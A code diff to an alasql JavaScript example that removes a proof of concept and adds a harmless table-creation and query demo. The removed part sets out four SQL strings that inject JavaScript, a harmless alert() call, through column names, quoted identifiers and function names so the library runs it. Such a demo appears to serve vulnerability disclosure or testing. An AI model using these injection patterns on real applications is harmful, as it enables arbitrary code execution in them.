@@ -1,20 +1,14 @@
-const genPayload = string => `alert(${JSON.stringify(string)})`;
+alasql("CREATE TABLE example1 (a INT, b INT)");
 
-const sql = [
-		// Initialize the database
-		'CREATE table i_am_a_table;',
-    `INSERT INTO i_am_a_table VALUES (1337);`,
-
-    // Code injection in four different ways
-    `UPDATE i_am_a_table SET [0'+${genPayload("UPDATE pwned")}+']=42;`,
-    `SELECT * from i_am_a_table where whatever=['+${genPayload("SELECT pwned")}+'];`,
-    `SELECT \`'+${genPayload("SELECT pwned again, back-quote works too.")}+'\` from i_am_a_table where 1;`,
-    `SELECT [whatever||${genPayload('calling function pwned')}||]('whatever');`
+// alasql's data store for a table can be assigned directly
+alasql.tables.example1.data = [
+    {a:2,b:6},
+    {a:3,b:4}
 ];
 
-print(sql)
+// ... or manipulated with normal SQL
+alasql("INSERT INTO example1 VALUES (1,5)");
 
-var res = alasql(sql.join(''));
+var res = alasql("SELECT * FROM example1 ORDER BY b DESC");
 
-print(res)
-	
+console.log(res); // [{a:2,b:6},{a:1,b:5},{a:3,b:4}]
